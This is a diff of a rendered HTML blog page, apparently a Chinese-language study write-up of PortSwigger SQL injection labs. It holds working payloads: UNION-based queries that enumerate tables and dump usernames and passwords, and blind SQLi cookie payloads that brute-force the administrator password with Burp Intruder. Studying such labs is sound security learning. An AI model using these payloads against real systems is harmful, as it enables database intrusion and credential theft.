@@ -176,21 +176,21 @@
             
             <span class="tag">
                 
-                <a href="/tags/PortSwigger/" style="color: #03a9f4">
+                <a href="/tags/PortSwigger/" style="color: #00bcd4">
                     PortSwigger
                 </a>
             </span>
             
             <span class="tag">
                 
-                <a href="/tags/SQLi/" style="color: #ff7d73">
+                <a href="/tags/SQLi/" style="color: #03a9f4">
                     SQLi
                 </a>
             </span>
             
             <span class="tag">
                 
-                <a href="/tags/Self-learning/" style="color: #00a596">
+                <a href="/tags/Self-learning/" style="color: #ffa2c4">
                     Self-learning
                 </a>
             </span>
@@ -220,24 +220,24 @@
 <p>整體流程：先看information_schema_tables有哪些table，再往下繼續進攻</p>
 </blockquote>
 <p>Payloads</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27+UNION+SELECT+table_name,+NULL+from+information_schema.tables--</span><br></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">27</span>+<span class="keyword">UNION</span>+<span class="keyword">SELECT</span>+<span class="built_in">table_name</span>,+<span class="keyword">NULL</span>+<span class="keyword">from</span>+information_schema.<span class="keyword">tables</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
 <p>要記得有兩個回傳值！</p>
 <p>發現有一個叫做 users_abcdef，繼續探索！</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27+UNION+SELECT+column_name,null+from+information_schema.columns+where+table_name=%27users_jvzepp%27--</span><br></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">27</span>+<span class="keyword">UNION</span>+<span class="keyword">SELECT</span>+<span class="built_in">column_name</span>,<span class="keyword">null</span>+<span class="keyword">from</span>+information_schema.<span class="keyword">columns</span>+<span class="keyword">where</span>+<span class="built_in">table_name</span>=%<span class="number">27</span>users_jvzepp%<span class="number">27</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
 <p>(發現這一題用”+”連接比較能夠執行，然後要注意是用information_schema_columns！)</p>
 <p><img src="https://hackmd.io/_uploads/rk3H1uUdJe.png" alt="image"></p>
 <p>往下一層走！</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27+UNION+SELECT+username_jxzshr,+password_sdwxli+from+users_oogkho--</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span>username_jxzshr,<span class="operator">+</span>password_sdwxli<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users_oogkho<span class="comment">--</span></span><br></pre></td></tr></table></figure>
 <p><img src="https://hackmd.io/_uploads/r1oWNYLOJx.png" alt="image"></p>
 <p>結束收工！</p>
 <p>p.s 問題點<br>其實我還是不知道該如何呼叫出這樣的表格<br>可能會再研究一陣子ww<br><img src="https://hackmd.io/_uploads/BkJw4K8OJe.png" alt="image"></p>
-<h2 id="Blind-SQL-injection-with-conditional-responses"><a href="#Blind-SQL-injection-with-conditional-responses" class="headerlink" title="Blind SQL injection with conditional responses"></a><strong>Blind SQL injection with conditional responses</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=&lt;那時候的cookie&gt;&#x27; AND &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<h2 id="Blind-SQL-injection-with-conditional-responses"><a href="#Blind-SQL-injection-with-conditional-responses" class="headerlink" title="Blind SQL injection with conditional responses"></a><strong>Blind SQL injection with conditional responses</strong></h2><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">TrackingId</span>=&lt;那時候的cookie&gt;<span class="string">&#x27; AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
 <p>測起來發現welcome back可以作為 Blind SQLi 判斷依據</p>
 <p>接著改Tracking ID</p>
 <p><code>&#39; and (select &#39;a&#39; from users where username = &#39;administrator&#39; and length(password)&gt;&lt;暴力破解的地方&gt;)=&#39;a</code></p>
 <p>發現這時候welcome back消失(從length觀察最明顯！)<br>所以密碼是 20 位！<br><img src="https://hackmd.io/_uploads/HJKLPqUdkx.png" alt="image"></p>
 <p>接下來會用到一個叫做 SUBSTRING() 的函式！<br>複習一下：<code>SUBSTRING(字串, 起始位置, 長度)</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SUBSTRING(&#x27;abcd&#x27;, 2, 1)  -- 取得 &#x27;b&#x27;</span><br><span class="line">SUBSTRING(&#x27;abcd&#x27;, 3, 2)  -- 取得 &#x27;cd&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">SUBSTRING</span><span class="params">(<span class="string">&#x27;abcd&#x27;</span>, <span class="number">2</span>, <span class="number">1</span>)</span></span>  -- 取得 <span class="string">&#x27;b&#x27;</span></span><br><span class="line"><span class="function"><span class="title">SUBSTRING</span><span class="params">(<span class="string">&#x27;abcd&#x27;</span>, <span class="number">3</span>, <span class="number">2</span>)</span></span>  -- 取得 <span class="string">&#x27;cd&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p>接著因為要一個一個測試太麻煩了，再交給intruder做一次！<br>然後因為我想要同時從第1-20位一個一個檢測a-z,0-9<br>有兩個位置，所以使用cluster bomb!</p>
 <p><code>Cookie: TrackingId=1Be9Mx18D4iTRv39&#39; and (select SUBSTRING(password,&lt;位置1&gt;,1) from users where username = &#39;administrator&#39;)=&#39;&lt;位置2&gt;;</code></p>
@@ -246,9 +246,9 @@
 <p>因為不是要用and了，是另外一個獨立的語句<br>所以在oracle裡面要用 || 連接語法！</p>
 </blockquote>
 <p>順便稍微複習一下 SQL 的 case 用法！</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT CASE</span><br><span class="line">         WHEN condition1 THEN result1</span><br><span class="line">         WHEN condition2 THEN result2</span><br><span class="line">         ELSE result_default</span><br><span class="line">       END</span><br></pre></td></tr></table></figure>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span></span><br><span class="line">         <span class="keyword">WHEN</span> condition1 <span class="keyword">THEN</span> result1</span><br><span class="line">         <span class="keyword">WHEN</span> condition2 <span class="keyword">THEN</span> result2</span><br><span class="line">         <span class="keyword">ELSE</span> result_default</span><br><span class="line">       <span class="keyword">END</span></span><br></pre></td></tr></table></figure>
 <p>舉例：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT name,</span><br><span class="line">       CASE</span><br><span class="line">         WHEN salary &lt; 3000 THEN &#x27;Low&#x27;</span><br><span class="line">         WHEN salary BETWEEN 3000 AND 5000 THEN &#x27;Medium&#x27;</span><br><span class="line">         ELSE &#x27;High&#x27;</span><br><span class="line">       END AS salary_category</span><br><span class="line">FROM employees;</span><br></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="type">name</span>,</span><br><span class="line">       <span class="keyword">CASE</span></span><br><span class="line">         <span class="keyword">WHEN</span> salary &lt; <span class="number">3000</span> <span class="keyword">THEN</span> <span class="string">&#x27;Low&#x27;</span></span><br><span class="line">         <span class="keyword">WHEN</span> salary <span class="keyword">BETWEEN</span> <span class="number">3000</span> <span class="keyword">AND</span> <span class="number">5000</span> <span class="keyword">THEN</span> <span class="string">&#x27;Medium&#x27;</span></span><br><span class="line">         <span class="keyword">ELSE</span> <span class="string">&#x27;High&#x27;</span></span><br><span class="line">       <span class="keyword">END</span> <span class="keyword">AS</span> salary_category</span><br><span class="line"><span class="keyword">FROM</span> employees;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://hackmd.io/_uploads/H1IfNat_Jx.png" alt="image"></p>
 <p><img src="https://hackmd.io/_uploads/rkve4pY_yg.png" alt="image"></p>
